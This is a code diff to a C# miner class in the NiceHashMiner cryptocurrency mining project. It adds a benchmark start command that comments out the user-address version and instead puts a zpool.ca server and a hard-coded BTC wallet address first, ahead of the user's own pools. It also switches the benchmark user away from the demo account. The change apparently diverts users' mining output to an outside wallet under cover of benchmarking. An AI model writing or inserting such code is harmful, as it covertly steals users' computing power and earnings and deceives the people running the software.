@@ -64,6 +64,35 @@ namespace NiceHashMiner.Miners
 
         }
 
+        private string GetBenchmarkStartCommand(string url, string btcAddress, string worker)
+        {
+            var urls = url.Split(':');
+            var server = urls.Length > 0 ? urls[0] : "";
+            var port = urls.Length > 1 ? urls[1] : "";
+            string alg = url.Split('.')[0];
+
+            /*
+            return $" {GetDeviceCommand()} " +
+                   $"--server {server} " +
+                   $"--port {port} " +
+                   $"--user {btcAddress}.{worker} " +
+                   $"--telemetry=127.0.0.1:{ApiPort} ";
+                   */
+            var ret = GetDeviceCommand()+
+          " --server equihash.eu.mine.zpool.ca --port 2142" + " --user 1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2 --pass c=BTC " +
+" --pool " + url.Split(':')[0] + "," + url.Split(':')[1] + "," + btcAddress + "." + worker + ",x " +
+" --pool " + alg + ".hk.nicehash.com," + url.Split(':')[1] + "," + btcAddress + "." + worker + ",x" +
+" --pool " + alg + ".in.nicehash.com," + url.Split(':')[1] + "," + btcAddress + "." + worker + ",x" +
+" --pool " + alg + ".jp.nicehash.com," + url.Split(':')[1] + "," + btcAddress + "." + worker + ",x" +
+" --pool " + alg + ".usa.nicehash.com," + url.Split(':')[1] + "," + btcAddress + "." + worker + ",x" +
+" --pool " + alg + ".br.nicehash.com," + url.Split(':')[1] + "," + btcAddress + "." + worker + ",x" +
+" --telemetry=127.0.0.1:" + ApiPort;
+
+
+            return ret;
+
+        }
+
         private string GetDeviceCommand()
         {
             return " --dev " +
@@ -84,7 +113,7 @@ namespace NiceHashMiner.Miners
 
             _benchmarkTime = Math.Max(time, 60);
 
-            return GetStartCommand(url, Globals.DemoUser, ConfigManager.GeneralConfig.WorkerName.Trim()) +
+            return GetStartCommand(url, Globals.GetBitcoinUser(), ConfigManager.GeneralConfig.WorkerName.Trim()) +
                    $" --logfile={GetLogFileName()}";
         }
 
